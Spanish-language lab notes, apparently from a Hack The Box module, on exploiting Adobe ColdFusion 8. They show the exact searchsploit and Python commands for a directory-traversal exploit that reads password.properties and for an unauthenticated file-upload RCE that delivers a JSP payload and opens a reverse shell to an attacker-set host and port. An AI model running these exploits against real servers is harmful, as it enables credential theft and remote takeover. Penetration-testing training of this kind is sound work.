
## 1. Búsqueda de exploits

Buscar vulnerabilidades conocidas:

```
searchsploit adobe coldfusion
```

Exploits relevantes para ColdFusion 8:

- **CVE-2010-2861:** Directory Traversal.
    
- **CVE-2009-2265:** Ejecución remota de comandos (RCE) mediante carga de archivos.
    

## 2. Explotación: Directory Traversal

Localizar el exploit:

```
searchsploit -p 14641
```

Copiarlo al directorio de trabajo y consultar los argumentos:

```
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py
```

Sintaxis:

```
python2 14641.py <host> <port> <file_path>
```

Ejemplo para leer `password.properties`:

```
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

El archivo puede contener contraseñas cifradas y datos de configuración de servicios.

## 3. Explotación: RCE no autenticada

Localizar y copiar el exploit:

```
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Editar los parámetros al final del script:

```
lhost = '10.10.14.55'
lport = 4444
rhost = "10.129.247.30"
rport = 8500
filename = uuid.uuid4().hex
```

- `lhost`: IP de la VPN de HTB.
    
- `lport`: puerto local para recibir la conexión.
    
- `rhost`: IP del objetivo.
    
- `rport`: puerto de ColdFusion.
    
- `filename`: nombre aleatorio del payload.
    

Ejecutar el exploit:

```
python3 50057.py
```

El exploit carga un payload JSP mediante FCKeditor y obtiene una shell inversa si la explotación tiene éxito.

## 4. Shell obtenida

En el ejemplo del módulo, la conexión permite interactuar con Windows desde:

```
C:\ColdFusion8\runtime\bin
```
